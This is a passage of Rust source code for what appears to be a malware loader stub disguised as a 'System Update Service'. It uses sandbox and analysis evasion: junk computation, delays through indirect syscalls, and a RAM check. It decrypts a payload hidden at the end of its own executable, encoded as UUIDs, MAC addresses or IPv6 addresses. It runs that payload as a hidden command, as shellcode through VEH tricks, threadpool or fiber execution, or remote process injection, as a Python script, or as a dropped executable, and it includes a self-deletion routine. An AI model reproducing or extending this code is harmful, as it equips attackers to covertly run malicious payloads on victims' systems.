        let close: FnCloseThreadpoolWork = core::mem::transmute(a_close);

        println!("Executing via Threadpool...");
        let work_handle = create(
            core::mem::transmute(base),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );
        println!("Threadpool Work Handle: {:x}", work_handle);
        if work_handle != 0 {
            submit(work_handle);
            println!("Threadpool Work Submitted. Waiting...");
            wait(work_handle, 0);
            println!("Threadpool Wait Returned.");
            close(work_handle);
            return true;
        }
    }
    false
}

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

fn init_logging() {
    // println!("[INFO] Initializing System Update Service v1.4.2.0...");
    if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        // println!("[INFO] Timestamp: {}", now.as_secs());
    }
    // println!("[INFO] Loading configuration from registry...");
    unsafe {
        let mut h_key = 0;
        // Obfuscated "Software\SystemMaintenance\Config"
        // Just dummy check
        let subkey = [0u8; 1];
        // let status = RegOpenKeyExA(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut h_key);
        // if status == 0 {
        //    RegCloseKey(h_key);
        // println!("[INFO] Configuration loaded.");
        // } else {
        // println!("[INFO] Default configuration loaded.");
        // }
    }
    // println!("[INFO] Checking system compatibility...");
    let mut x = JUNK_SEED_1;
    for _ in 0..JUNK_LOOP_COUNT {
        x = x.wrapping_add(JUNK_SEED_2).wrapping_mul(3);
        core::hint::black_box(x);
    }
    // println!("[INFO] Environment check passed.");
}

fn fake_verification() {
    // println!("[INFO] Verifying component integrity...");
    let mut hash: u64 = JUNK_SEED_3;
    for i in 0..JUNK_LOOP_COUNT {
        hash = hash.wrapping_add(i as u64).wrapping_mul(JUNK_SEED_1);
        core::hint::black_box(hash);
    }
    if hash != 0 {
        // println!("[INFO] Integrity verified. Signature valid.");
    }
}

unsafe fn delay_execution() {
    println!("[INFO] Synchronizing with system time...");
    let (ssn_wait, addr_wait) =
        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));

    if addr_wait != 0 {
        // Delay 3-7 seconds based on random seed
        let seconds = 3 + (JUNK_SEED_1 % 5);
        let mut timeout: i64 = -((seconds as i64) * 10_000_000);

        // Wait on CurrentProcess (pseudo-handle -1) which is non-signaled until termination
        // This effectively sleeps until timeout
        syscall(
            ssn_wait,
            addr_wait,
            -1isize as usize,                // Handle
            0,                               // Alertable
            &mut timeout as *mut _ as usize, // Timeout
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
        );
    } else {
        // Fallback to heavy math loop if syscall resolution fails
        let mut x = JUNK_SEED_2;
        for _ in 0..500_000_000 {
            x = x.wrapping_mul(3).wrapping_add(1);
            core::hint::black_box(x);
        }
    }
    println!("[INFO] Synchronization complete.");
}

fn main() {
    init_logging();
    fake_verification();
    api_hammering();

    unsafe { delay_execution() };

    // Replaced NtDelayExecution with math loop to avoid static signatures
    // let mut interval: i64 = -50_000_000;
    // Dummy usage to prevent optimization but don't actually call NtDelayExecution
    // core::hint::black_box(&mut interval);

    // Additional junk calculation
    let mut x = 12345u64;
    for _ in 0..1000 {
        x = x
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        core::hint::black_box(x);
    }
    if x == 0 {}

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    println!("Stub started, exe: {:?}", exe_path);
    let mut buf = Vec::new();
    if fs::File::open(&exe_path)
        .and_then(|mut f| f.read_to_end(&mut buf))
        .is_err()
    {
        println!("Failed to read self");
        return;
    }

    let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
    let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
        println!("Marker not found in {} bytes", buf.len());
        return;
    };
    println!("Marker found at offset {}", off);

    if off + 4 > buf.len() {
        return;
    }
    let flag = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap());
    off += 4;

    if off + 4 > buf.len() {
        return;
    }
    let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if off + key_len > buf.len() {
        return;
    }
    let key = &buf[off..off + key_len];
    off += key_len;

    if off + 4 > buf.len() {
        return;
    }
    let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if off + nonce_len > buf.len() {
        return;
    }
    let nonce_bytes = &buf[off..off + nonce_len];
    off += nonce_len;

    if off + 8 > buf.len() {
        return;
    }
    let orig_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
    off += 8;

    if off + 8 > buf.len() {
        return;
    }
    let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
    off += 8;
    if off + ct_len > buf.len() {
        return;
    }
    let ciphertext_raw = &buf[off..off + ct_len];

    let ciphertext = match flag {
        1 => {
            // UUID
            let s = String::from_utf8_lossy(ciphertext_raw);
            let mut out = Vec::new();
            for line in s.lines() {
                let clean = line.trim().replace("\"", "").replace(",", "");
                if clean.is_empty() {
                    continue;
                }
                // Parse UUID: 8-4-4-4-12
                let hex = clean.replace("-", "");
                if hex.len() == 32 {
                    let mut bytes = [0u8; 16];
                    for i in 0..16 {
                        if let Ok(b) = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16) {
                            bytes[i] = b;
                        }
                    }
                    // UUID in rust is usually LE bytes, but string is BE.
                    // packer used Uuid::from_bytes_le(chunk).to_string()
                    // Uuid::to_string outputs Big Endian hex usually.
                    // But from_bytes_le takes LE bytes and treats them as fields.
                    // Let's reverse what packer did.
                    // Packer: bytes (LE) -> Uuid -> String (BE visualization of fields)
                    // We need: String -> Uuid -> bytes (LE)
                    // Actually, if we just want to recover bytes:
                    // We can just parse the hex bytes in order if the Uuid struct preserves order?
                    // No, UUID fields are endian-sensitive.
                    // Let's check how Uuid::to_string works.
                    // 00112233-4455-6677-8899-aabbccddeeff
                    // If we parse this back to u128 or bytes.
                    // Since I don't want to depend on uuid crate, I'll assume standard layout.
                    // Wait, packer uses `Uuid::from_bytes_le`.
                    // If I use `Uuid::parse_str(s).unwrap().to_bytes_le()`, I get original bytes.
                    // Since I don't have uuid crate, I need to replicate `parse_str` -> `to_bytes_le`.
                    // `to_bytes_le` swaps bytes for d1, d2, d3.
                    // d1: u32 (4 bytes), d2: u16, d3: u16. d4: [u8; 8].
                    // UUID string: d1-d2-d3-d4
                    // "00112233-4455-6677-8899-aabbccddeeff"
                    // d1=00112233, d2=4455, d3=6677, d4=8899aabbccddeeff
                    // to_bytes_le:
                    // d1.to_le_bytes() -> 33 22 11 00
                    // d2.to_le_bytes() -> 55 44
                    // d3.to_le_bytes() -> 77 66
                    // d4 is just bytes -> 88 99 aa bb cc dd ee ff

                    let d1 = u32::from_str_radix(&hex[0..8], 16).unwrap_or(0);
                    let d2 = u16::from_str_radix(&hex[8..12], 16).unwrap_or(0);
                    let d3 = u16::from_str_radix(&hex[12..16], 16).unwrap_or(0);

                    out.extend_from_slice(&d1.to_le_bytes());
                    out.extend_from_slice(&d2.to_le_bytes());
                    out.extend_from_slice(&d3.to_le_bytes());
                    for i in 0..8 {
                        let b =
                            u8::from_str_radix(&hex[16 + i * 2..16 + i * 2 + 2], 16).unwrap_or(0);
                        out.push(b);
                    }
                }
            }
            // Remove padding (NOPs = 0x90)
            if out.len() > orig_len {
                out.truncate(orig_len);
            }
            out
        }
        2 => {
            // MAC
            let s = String::from_utf8_lossy(ciphertext_raw);
            let mut out = Vec::new();
            for line in s.lines() {
                let clean = line.trim();
                if clean.is_empty() {
                    continue;
                }
                let parts: Vec<&str> = clean.split('-').collect();
                for p in parts {
                    if let Ok(b) = u8::from_str_radix(p, 16) {
                        out.push(b);
                    }
                }
            }
            // Remove padding (0x00)
            if out.len() > orig_len {
                out.truncate(orig_len);
            }
            out
        }
        3 => {
            // IPv6
            let s = String::from_utf8_lossy(ciphertext_raw);
            let mut out = Vec::new();
            for line in s.lines() {
                let clean = line.trim();
                if clean.is_empty() {
                    continue;
                }
                let parts: Vec<&str> = clean.split(':').collect();
                for p in parts {
                    if let Ok(val) = u16::from_str_radix(p, 16) {
                        out.extend_from_slice(&val.to_be_bytes());
                    }
                }
            }
            // Remove padding (0x00)
            if out.len() > orig_len {
                out.truncate(orig_len);
            }
            out
        }
        _ => ciphertext_raw.to_vec(),
    };

    println!("Decrypting {} bytes...", ciphertext.len());
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => {
            println!("Cipher init failed");
            return;
        }
    };
    let nonce = Nonce::from_slice(nonce_bytes);
    let decrypted = match cipher.decrypt(nonce, ciphertext.as_ref()) {
        Ok(p) => p,
        Err(_) => {
            println!("Decryption failed");
            return;
        }
    };
    println!("Decryption success, decompressing...");
    let mut payload = match zstd::decode_all(&decrypted[..]) {
        Ok(p) => p,
        Err(e) => {
            println!("Decompression failed: {}", e);
            return;
        }
    };
    println!("Decompression success, payload size: {}", payload.len());

    if payload.starts_with(b"CMD\0") {
        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
        let exe_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.to_path_buf()))
            .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| std::env::temp_dir()));
        let lower = cmd.trim().to_lowercase();
        if lower.starts_with("echo ") && cmd.contains('>') {
            let parts: Vec<&str> = cmd.splitn(2, '>').collect();
            let left = parts.get(0).map(|s| s.trim()).unwrap_or("");
            let right = parts.get(1).map(|s| s.trim()).unwrap_or("");
            let content = left.strip_prefix("echo").map(|s| s.trim()).unwrap_or("");
            if !right.is_empty() {
                let mut out_path = exe_dir.clone();
                out_path.push(right);
                if let Some(parent) = out_path.parent() {
                    let _ = fs::create_dir_all(parent);
                }
                let _ = fs::write(&out_path, format!("{}\r\n", content));
            }
        } else {
            if Command::new(&cmd)
                .current_dir(&exe_dir)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn()
                .is_err()
            {
                let _ = Command::new("cmd.exe")
                    .arg("/C")
                    .arg(&cmd)
                    .current_dir(&exe_dir)
                    .creation_flags(CREATE_NO_WINDOW)
                    .spawn();
            }
        }
        payload.fill(0);
        return;
    }

    if payload.starts_with(b"SC\0") {
        println!("Payload type: SC");
        let mut p = 3usize;
        if p >= payload.len() {
            println!("SC Payload too short");
            return;
        }
        let mode = payload[p];
        p += 1;
        let mut remote_path: Option<String> = None;
        if mode == 1 {
            if p + 4 > payload.len() {
                return;
            }
            let rlen = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
            p += 4;
            if p + rlen > payload.len() {
                return;
            }
            remote_path = Some(String::from_utf8_lossy(&payload[p..p + rlen]).to_string());
            p += rlen;
        }
        if p + 4 > payload.len() {
            return;
        }
        let sc_len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + sc_len > payload.len() {
            return;
        }
        let sc = &payload[p..p + sc_len];
        println!("SC extracted, len: {}, mode: {}", sc_len, mode);

        unsafe {
            let ntdll = get_ntdll_base();
            println!("NTDLL Base: {:x}", ntdll);

            if ntdll == 0 {
                println!("Failed to find NTDLL base");
                return;
            }

            let (ssn_alloc, addr_alloc) =
                get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
            let (_ssn_write, _addr_write) =
                get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
            let (ssn_protect, addr_protect) =
                get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));

            SSN_PROTECT = ssn_protect;
            ADDR_PROTECT = addr_protect;

            println!("SSN Alloc: {:x}, Addr: {:x}", ssn_alloc, addr_alloc);

            if addr_alloc == 0 {
                println!("Failed to resolve NtAllocateVirtualMemory");
                return;
            }

            if mode == 1 {
                if let Some(s) = remote_path.as_deref() {
                    println!("Injecting into remote process: {}", s);
                    exec_remote(sc, s);
                }
            } else {
                let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
                // let size = sc_len;

                let process_handle = -1isize as usize as isize;

                let k32 = get_kernel32_base();
                if k32 == 0 {
                    println!("Failed to find Kernel32");
                    return;
                }

                use windows_sys::Win32::System::SystemInformation::{
                    GlobalMemoryStatusEx, MEMORYSTATUSEX,
                };
                let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
                mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
                GlobalMemoryStatusEx(&mut mem_status);
                if mem_status.ullTotalPhys < 4 * 1024 * 1024 * 1024 {
                    println!("System check failed (RAM)");
                    return;
                }

                println!("Allocating memory via Indirect Syscall...");

                let mut alloc_base: usize = 0;
                let mut alloc_size = sc_len + 256 * 1024;

                let status_alloc = syscall(
                    ssn_alloc,
                    addr_alloc,
                    0xffffffffffffffff,                  // ProcessHandle (Current)
                    &mut alloc_base as *mut _ as usize,  // *BaseAddress
                    0,                                   // ZeroBits
                    &mut alloc_size as *mut _ as usize,  // *RegionSize
                    (MEM_COMMIT | MEM_RESERVE) as usize, // AllocationType
                    PAGE_READWRITE as usize,             // Protect
                    0,
                    0,
                    0,
                    0,
                    0,
                );

                if status_alloc == 0 {
                    let offset = 32 * 1024;
                    if offset + sc_len < alloc_size {
                        base = (alloc_base as *mut u8).add(offset) as *mut core::ffi::c_void;
                    } else {
                        base = alloc_base as *mut core::ffi::c_void;
                    }
                }

                println!("Alloc ptr: {:?}", base);

                if !base.is_null() {
                    let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);

                    println!("Writing memory via memcpy...");
                    dst.copy_from_slice(sc);
                    println!("Write done");

                    // VEH-based Execution Evasion:
                    // Do NOT set PAGE_EXECUTE_READ. Leave as PAGE_READWRITE.
                    // Register VEH to handle execution violation (DEP) and flip to RX just-in-time.

                    SC_ADDR = base as usize;
                    SC_SIZE = sc_len;

                    let veh_handle = AddVectoredExceptionHandler(1, Some(veh_guard));
                    println!("VEH Registered: {:p}", veh_handle);

                    // Skip explicit protection
                    let res = 0;
                    /*
                    let mut old = 0;
                    let mut prot_size = sc_len;
                    let res = syscall(
                        ssn_protect,
                        addr_protect,
                        0xffffffffffffffff,                      // ProcessHandle
                        &mut (base as usize) as *mut _ as usize, // *BaseAddress
                        &mut prot_size as *mut _ as usize,       // *RegionSize
                        PAGE_EXECUTE_READ as usize,              // NewProtect
                        &mut old as *mut _ as usize,             // *OldProtect
                        0,
                        0,
                        0,
                        0,
                        0,
                        0,
                    );
                    */

                    let status_prot = if res == 0 { 1 } else { 0 };

                    if status_prot != 0 {
                        /*
                        if let Some(orig) = hook_iat("kernel32.dll", "Sleep", sleep_detour as usize)
                        {
                            SLEEP_ORIGINAL = orig;
                        }
                        if let Some(orig) =
                            hook_iat("kernel32.dll", "SleepEx", sleep_ex_detour as usize)
                        {
                            SLEEP_EX_ORIGINAL = orig;
                        }
                        */

                        println!("Executing...");
                        use rand::RngCore;
                        let mut rng_key = [0u8; 1];
                        rand::thread_rng().fill_bytes(&mut rng_key);
                        ENC_KEY = rng_key[0];
                        if ENC_KEY == 0 {
                            ENC_KEY = 0xAA;
                        }

                        // Try Threadpool first if obfuscated, else Fiber
                        let mut executed = false;
                        if flag > 0 {
                            if exec_threadpool(base, sc_len) {
                                executed = true;
                            }
                        }

                        if !executed {
                            println!("Executing via Fiber...");
                            let addr_convert = get_export_addr(k32, HASH_CONVERT_THREAD_TO_FIBER);
                            let addr_create = get_export_addr(k32, HASH_CREATE_FIBER);
                            let addr_switch = get_export_addr(k32, HASH_SWITCH_TO_FIBER);

                            if let (Some(a_conv), Some(a_create), Some(a_switch)) =
                                (addr_convert, addr_create, addr_switch)
                            {
                                let convert: FnConvertThreadToFiber = core::mem::transmute(a_conv);
                                let create: FnCreateFiber = core::mem::transmute(a_create);
                                let switch: FnSwitchToFiber = core::mem::transmute(a_switch);

                                let main_fiber = convert(core::ptr::null_mut());
                                MAIN_FIBER = main_fiber; // Store main fiber

                                if !main_fiber.is_null() {
                                    let sc_fiber = create(0, fiber_start, base);
                                    if !sc_fiber.is_null() {
                                        switch(sc_fiber);
                                        executed = true;
                                    }
                                }
                            }
                        }

                        if executed {
                            println!("Shellcode finished, cleaning up...");
                            let mut old_prot = 0;
                            let mut size = sc_len;
                            if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
                                syscall(
                                    SSN_PROTECT,
                                    ADDR_PROTECT,
                                    0xffffffffffffffff,
                                    &mut (base as usize) as *mut _ as usize,
                                    &mut size as *mut _ as usize,
                                    PAGE_READWRITE as usize,
                                    &mut old_prot as *mut _ as usize,
                                    0,
                                    0,
                                    0,
                                    0,
                                    0,
                                    0,
                                );
                            } else {
                                VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
                            }

                            core::ptr::write_bytes(base, 0, size);
                            println!("Memory wiped");
                        }
                    } else {
                        println!("Protect failed");
                    }
                } else {
                    println!("Alloc failed or base is null");
                }
                if process_handle != 0 && process_handle != -1 {
                    CloseHandle(process_handle);
                }
            }
        }
        payload.fill(0);
        return;
    }

    if payload.starts_with(b"PY\0") {
        let mut p = 4usize;
        if p + 4 > payload.len() {
            return;
        }
        let len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + len > payload.len() {
            return;
        }
        let script = String::from_utf8_lossy(&payload[p..p + len]).to_string();
        let _ = Command::new("pythonw.exe")
            .arg("-c")
            .arg(script)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
        return;
    }

    if payload.starts_with(b"MZ") {
        let mut out_path: PathBuf = std::env::temp_dir();
        out_path.push(format!("rs_p_{}.exe", std::process::id()));
        if fs::write(&out_path, &payload).is_ok() {
            let _ = Command::new(&out_path)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn();
        }
    }
}

#[allow(dead_code)]
fn self_delete() {
    if let Ok(exe_path) = std::env::current_exe() {
        let mut bat = std::env::temp_dir();
        bat.push(format!("{:x}_rm.cmd", std::process::id()));
        let script = format!(
            "@echo off\r\nping -n 2 127.0.0.1 >nul\r\ndel /f /q \"{}\"\r\ndel /f /q \"%~f0\"\r\n",
            exe_path.display()
        );
        let _ = fs::write(&bat, script);
        let _ = Command::new("cmd.exe")
            .arg("/C")
            .arg(&bat)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}
